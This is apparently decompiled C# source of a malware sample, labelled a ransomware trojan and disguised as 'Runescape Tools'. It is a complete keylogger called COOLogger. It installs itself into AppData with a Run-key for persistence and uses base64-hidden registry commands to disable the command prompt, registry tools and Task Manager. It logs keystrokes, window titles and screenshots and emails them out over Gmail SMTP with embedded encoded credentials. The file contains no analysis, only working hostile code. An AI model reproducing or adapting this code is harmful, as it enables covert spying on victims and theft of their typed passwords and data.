// Decompiled with JetBrains decompiler
// Type: EvUjcNuwRtyMWrF
// Assembly: Runescape Tools Updated Feb 19 By KMC, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6A789929-79F0-4807-91EA-3E7E4DC6DF70
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare.00031-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-2bc5a4e0785cb88f91e7dfb03d780ecb5d65042c43e73eee9ca864359c2c9315.exe.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class EvUjcNuwRtyMWrF
{
  private static string seGcbDkCnrSsExQ = "amFjb2JzMTEyMkBnbWFpbC5jb20=";
  private static string NjFeWSduKfTczuY = "eW11YnR5Y3l0NHZl";
  private static string aHagodJSTRWtzHl = "smtp.gmail.com";
  private static int yxOSUMlBsdLNhKP = 587;
  private static string SrHyjRTnQVjtObP;
  private static string CcyxaHYLPoPaUmj;
  private static string GcBsoBRgCpyWRuw;
  private static string dxDLzgopnsQXeIV;
  private static string UkoriIXQzhjFhlz;
  private static string XNsCDBGqjqVihxB;
  private static int JUOgPmWgmiuLahj = 1800000;
  private static string pMYmUlXbCpmgywT = (string) null;
  private static string xBEvUjcNuwRtyMW = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";
  private static string rFseGcbDkCnrSsE = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static string xQNjFeWSduKfTcz = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static object cZIVuuWfrTnSqJi = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string sQLoqXdwFtZVVUZ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage KQYoPOeUXPnRvtb = new MailMessage();
  private static SmtpClient hMvrgBrivGoocOp = new SmtpClient();
  [AccessedThroughProperty("MvrgBrivGoocOpM")]
  private static MYmUlXbCpmgywTo _MvrgBrivGoocOpM;
  private static object mxBQlmvGBetNgzu;
  private static RichTextBox EhMvrgBrivGoocO;

  static EvUjcNuwRtyMWrF()
  {
    EvUjcNuwRtyMWrF.MvrgBrivGoocOpM = new MYmUlXbCpmgywTo();
    EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu = (object) Path.GetFileName(Application.ExecutablePath);
    EvUjcNuwRtyMWrF.EhMvrgBrivGoocO = new RichTextBox();
  }

  private static MYmUlXbCpmgywTo MvrgBrivGoocOpM
  {
    get => EvUjcNuwRtyMWrF._MvrgBrivGoocOpM;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (EvUjcNuwRtyMWrF._MvrgBrivGoocOpM != null)
        MYmUlXbCpmgywTo.KeyDown -= new MYmUlXbCpmgywTo.KeyDownEventHandler(EvUjcNuwRtyMWrF.BEvUjcNuwRtyMWr);
      EvUjcNuwRtyMWrF._MvrgBrivGoocOpM = value;
      if (EvUjcNuwRtyMWrF._MvrgBrivGoocOpM == null)
        return;
      MYmUlXbCpmgywTo.KeyDown += new MYmUlXbCpmgywTo.KeyDownEventHandler(EvUjcNuwRtyMWrF.BEvUjcNuwRtyMWr);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int dvIvtnGDZJUZVhy(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    EvUjcNuwRtyMWrF.XNsCDBGqjqVihxB = Conversions.ToString(true);
    EvUjcNuwRtyMWrF.GcBsoBRgCpyWRuw = Conversions.ToString(true);
    EvUjcNuwRtyMWrF.dxDLzgopnsQXeIV = Conversions.ToString(true);
    EvUjcNuwRtyMWrF.UkoriIXQzhjFhlz = Conversions.ToString(false);
    EvUjcNuwRtyMWrF.CcyxaHYLPoPaUmj = Conversions.ToString(true);
    EvUjcNuwRtyMWrF.SrHyjRTnQVjtObP = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\nuLllBqtlKnSQxm.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(EvUjcNuwRtyMWrF.sQLoqXdwFtZVVUZ + "\\nuLllBqtlKnSQxm.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\"), EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\"), EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\"), EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\"), EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\"), EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(EvUjcNuwRtyMWrF.SrHyjRTnQVjtObP) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu), Operators.ConcatenateObject(Operators.ConcatenateObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\"), EvUjcNuwRtyMWrF.mxBQlmvGBetNgzu));
    if (Conversions.ToBoolean(EvUjcNuwRtyMWrF.CcyxaHYLPoPaUmj))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\nuLllBqtlKnSQxm.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(EvUjcNuwRtyMWrF.GcBsoBRgCpyWRuw))
      Interaction.Shell(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.xBEvUjcNuwRtyMW), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(EvUjcNuwRtyMWrF.dxDLzgopnsQXeIV))
      Interaction.Shell(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.rFseGcbDkCnrSsE), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(EvUjcNuwRtyMWrF.UkoriIXQzhjFhlz))
      Interaction.Shell(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.xQNjFeWSduKfTcz), AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 1800000;
    timer1.Tick += new EventHandler(EvUjcNuwRtyMWrF.YmUlXbCpmgywToN_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(EvUjcNuwRtyMWrF.TPbesPQZjeIXpKd_Ticked);
    timer2.Start();
    EvUjcNuwRtyMWrF.MvrgBrivGoocOpM.NTPbesPQZjeIXpK();
    Application.Run();
  }

  private static string cxzJgOqHntNVKql()
  {
    string lpString = new string(char.MinValue, 100);
    EvUjcNuwRtyMWrF.dvIvtnGDZJUZVhy(EvUjcNuwRtyMWrF.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string FseGcbDkCnrSsEx(string lyxOSUMlBsdLNhK) => Encoding.ASCII.GetString(Convert.FromBase64String(lyxOSUMlBsdLNhK));

  public static void YmUlXbCpmgywToN_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(EvUjcNuwRtyMWrF.XNsCDBGqjqVihxB))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = EvUjcNuwRtyMWrF.KdXNsCDBGqjqVih(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(EvUjcNuwRtyMWrF.cZIVuuWfrTnSqJi, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.seGcbDkCnrSsExQ));
        message.To.Add(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.seGcbDkCnrSsExQ));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = EvUjcNuwRtyMWrF.EhMvrgBrivGoocO.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.seGcbDkCnrSsExQ), EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.NjFeWSduKfTczuY))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        EvUjcNuwRtyMWrF.EhMvrgBrivGoocO.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage kqYoPoeUxPnRvtb = EvUjcNuwRtyMWrF.KQYoPOeUXPnRvtb;
      kqYoPoeUxPnRvtb.From = new MailAddress(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.seGcbDkCnrSsExQ));
      kqYoPoeUxPnRvtb.To.Add(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.seGcbDkCnrSsExQ));
      kqYoPoeUxPnRvtb.Subject = "COOLogger Logs from - " + Environment.UserName;
      kqYoPoeUxPnRvtb.Body = EvUjcNuwRtyMWrF.EhMvrgBrivGoocO.Text;
      SmtpClient hMvrgBrivGoocOp = EvUjcNuwRtyMWrF.hMvrgBrivGoocOp;
      hMvrgBrivGoocOp.Host = "smtp.gmail.com";
      hMvrgBrivGoocOp.Port = 587;
      hMvrgBrivGoocOp.EnableSsl = true;
      hMvrgBrivGoocOp.Credentials = (ICredentialsByHost) new NetworkCredential(EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.seGcbDkCnrSsExQ), EvUjcNuwRtyMWrF.FseGcbDkCnrSsEx(EvUjcNuwRtyMWrF.NjFeWSduKfTczuY));
      hMvrgBrivGoocOp.Send(EvUjcNuwRtyMWrF.KQYoPOeUXPnRvtb);
      EvUjcNuwRtyMWrF.EhMvrgBrivGoocO.Text = "";
    }
  }

  public static void BEvUjcNuwRtyMWr(Keys e) => EvUjcNuwRtyMWrF.EhMvrgBrivGoocO.Text += EvUjcNuwRtyMWrF.MvrgBrivGoocOpM.dXNsCDBGqjqVihx(e);

  public static void TPbesPQZjeIXpKd_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(EvUjcNuwRtyMWrF.pMYmUlXbCpmgywT, EvUjcNuwRtyMWrF.cxzJgOqHntNVKql(), false) == 0)
      return;
    EvUjcNuwRtyMWrF.pMYmUlXbCpmgywT = EvUjcNuwRtyMWrF.cxzJgOqHntNVKql();
    if (Operators.CompareString(EvUjcNuwRtyMWrF.pMYmUlXbCpmgywT, "", false) == 0)
      return;
    RichTextBox ehMvrgBrivGoocO = EvUjcNuwRtyMWrF.EhMvrgBrivGoocO;
    ehMvrgBrivGoocO.Text = ehMvrgBrivGoocO.Text + "\r\n\r\n~~~~~" + EvUjcNuwRtyMWrF.pMYmUlXbCpmgywT + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string KdXNsCDBGqjqVih(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
